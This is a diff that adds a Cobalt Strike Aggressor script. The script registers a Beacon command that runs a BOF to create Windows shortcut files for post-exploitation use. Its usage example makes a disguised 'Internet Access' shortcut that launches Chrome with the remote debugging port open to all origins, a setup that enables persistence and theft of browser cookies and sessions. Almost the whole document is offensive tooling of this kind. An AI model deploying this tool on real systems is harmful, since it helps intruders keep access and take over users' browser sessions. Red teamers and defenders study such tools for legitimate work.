@@ -1,0 +1,49 @@
+beacon_command_register(
+"LNKgenerator", 
+"Create an LNK (shortcut) file for PostEx activities", 
+"Usage: LNKgenerator <targetFile> <targetArgs> <lnkFileLocation> <description> <curDir> <iconFile> [iShowmode] [iIconindex] \
+Example: LNKgenerator \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" \"--remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=C:\\Users\\Public\\Documents\" \"C:\\Users\\defaultuser\\Desktop\\test.lnk\" \"Internet Access\" \"C:\\Program Files\\Google\\Chrome\\Application\" \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" 1 0 \
+LNK Show Modes https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow ");
+
+alias LNKgenerator {
+
+    local('$barch $handle $data $args $all');
+    $barch = barch($1);
+    # read in our BOF file...   
+    $handle = openf(script_resource("LNKgenerator-BOF." . $barch . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+    if(size(@_) < 7)
+	{
+		berror($1, beacon_command_detail("LNKgenerator"));
+		return;
+	}
+    $targetFile = $2;
+    $targetArgs = $3;
+    $lnkFileLocation = $4;
+    $description = $5;
+    $curDir = $6; 
+    $iconFile = $7;
+
+    $iShowmode = 1;
+    $iIconindex = 0;
+    if(size(@_) > 7)
+	{
+		$iShowmode = $8;
+        if(size(@_) > 8)
+	    {
+            $iIconindex = $9
+        }
+	}
+
+    $bof_args = bof_pack($1, "ZZZZZZii", $targetFile, $targetArgs, $lnkFileLocation, $description, $curDir, $iconFile, $iShowmode, $iIconindex);
+    btask($1, "Running LNKgenerator BOF");
+    beacon_inline_execute($1, $data, "go", $bof_args);
+
+}
